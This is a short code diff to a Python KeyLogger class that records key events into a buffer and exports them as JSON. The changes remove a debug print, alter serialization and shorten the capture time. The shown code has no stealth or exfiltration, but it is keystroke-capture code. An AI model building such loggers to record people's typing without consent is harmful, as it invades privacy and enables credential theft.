@@ -69,7 +69,6 @@ class KeyLogger:
         if not self._buffer:
             return ""
         string_log = []
-        print(self._buffer[0].__dir__())
         for event in self._buffer:
             if event.event_type == 'down':
                 string_log.append(event.name)
@@ -86,7 +85,7 @@ class KeyLogger:
     def to_dicts(self):
         if not self._buffer:
             return []
-        return [event.to_json for event in self._buffer]
+        return [event.__dict__ for event in self._buffer]
 
     def to_json(self):
         return json.dumps(self.to_dicts())
@@ -94,9 +93,7 @@ class KeyLogger:
 
 def main():
     my_keylogger = KeyLogger()
-    my_keylogger.log_keys_for(seconds=5)
-    my_keylogger.get_string_log()
-
+    my_keylogger.log_keys_for(seconds=2)
 
 if __name__ == '__main__':
     main()
